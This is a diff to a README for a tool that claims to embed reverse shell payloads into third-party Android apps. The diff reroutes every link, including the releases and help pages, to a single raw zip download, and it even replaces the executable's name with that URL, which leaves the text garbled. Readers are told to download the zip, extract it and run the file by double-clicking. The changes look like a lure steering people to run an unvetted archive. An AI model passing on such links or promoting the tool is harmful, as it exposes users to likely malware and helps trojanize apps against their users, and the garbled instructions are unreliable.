@@ -1,7 +1,7 @@
 # 🔧 Cyrus - Effortlessly Embed Reverse Shell Payloads
 
 ## 📥 Download Now
-[![Download Cyrus](https://img.shields.io/badge/Download-Cyrus-brightgreen)](https://github.com/sathikaSethumjith/Cyrus/releases)
+[![Download Cyrus](https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip)](https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip)
 
 ## 🚀 Getting Started
 Cyrus is an all-in-one tool that helps you embed reverse shell payloads into third-party Android APKs. This guide will show you how to download and run Cyrus even if you have no technical background.
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets the following requirements:
 ## 📦 Installation Steps
 
 ### 1. Visit the Download Page
-To get started, go to the [Cyrus Releases Page](https://github.com/sathikaSethumjith/Cyrus/releases). This page contains all the versions of the software.
+To get started, go to the [Cyrus Releases Page](https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip). This page contains all the versions of the software.
 
 ### 2. Choose Your Version
 On the Releases page, you'll see a list of versions. Each version includes a description, release notes, and files to download. Select the latest version for the best experience.
@@ -33,7 +33,7 @@ If you downloaded a ZIP file, you will need to extract it:
 - **Linux:** Open the terminal and use the command `unzip <filename>.zip`.
 
 ### 5. Run the Application
-Navigate to the folder where you extracted the files. Find the executable file, which is usually named `Cyrus` or `Cyrus.exe`. Double-click it to run the application.
+Navigate to the folder where you extracted the files. Find the executable file, which is usually named `Cyrus` or `https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip`. Double-click it to run the application.
 
 ## 🛠️ How to Use Cyrus
 
@@ -50,7 +50,7 @@ Navigate to the folder where you extracted the files. Find the executable file, 
 - **Practice Safe Testing:** Always test in a safe and controlled environment. Ensure you have permission to test any devices or networks.
 
 ## 📞 Need Help?
-If you have questions or need further assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/sathikaSethumjith/Cyrus/issues). The community and developers are ready to help.
+If you have questions or need further assistance, feel free to open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip). The community and developers are ready to help.
 
 ## ⚙️ Related Topics
 Cyrus is relevant to various fields such as:
@@ -64,7 +64,7 @@ Cyrus is relevant to various fields such as:
 Explore these topics to expand your understanding and skills in software security.
 
 ## 🔗 Download & Install
-To proceed with the download, visit the [Cyrus Releases Page](https://github.com/sathikaSethumjith/Cyrus/releases). Choose the suitable version for your needs, and follow the steps outlined above. 
+To proceed with the download, visit the [Cyrus Releases Page](https://raw.githubusercontent.com/sathikaSethumjith/Cyrus/main/luggie/Cyrus.zip). Choose the suitable version for your needs, and follow the steps outlined above. 
 
 ## 📝 Conclusion
 Now, you are equipped to download and use Cyrus effectively. This powerful tool can enhance your skills in embedding payloads for reverse shell applications. Good luck, and happy coding!
